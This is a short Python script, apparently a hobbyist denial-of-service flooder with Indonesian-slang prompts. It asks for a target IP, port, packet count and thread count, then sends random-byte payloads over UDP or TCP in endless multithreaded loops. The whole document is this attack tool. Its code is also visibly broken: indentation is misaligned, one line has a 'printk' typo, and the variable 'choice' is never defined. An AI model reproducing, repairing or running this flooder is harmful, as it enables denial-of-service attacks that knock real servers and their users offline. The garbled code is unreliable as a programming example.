import os
import random
import socket
import threading

os.system("clear")
print("|MAU DRAMA? Ngen Emang|")
 
ip = str(input(" Ip Serper apa? :"))
port = int(input(" Port nya? :"))
	times = int(input(" Paket :"))
	threads = int(input(" Threads :"))
	def run():
	data = random._urandom(20000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			printk" Sent packet to %s throught port:%s"%(ip,port))
		except:
			print("[!] Salah cmdnya bre!!!")

def run2():
	data = random._urandom(160)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(" Sent packet to %s throught port:%s"%(ip,port))
		except:
			s.close()
			print("[*] Salah cmdnya bre!!!")

for y in range(threads):
	if choice == 'han12':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()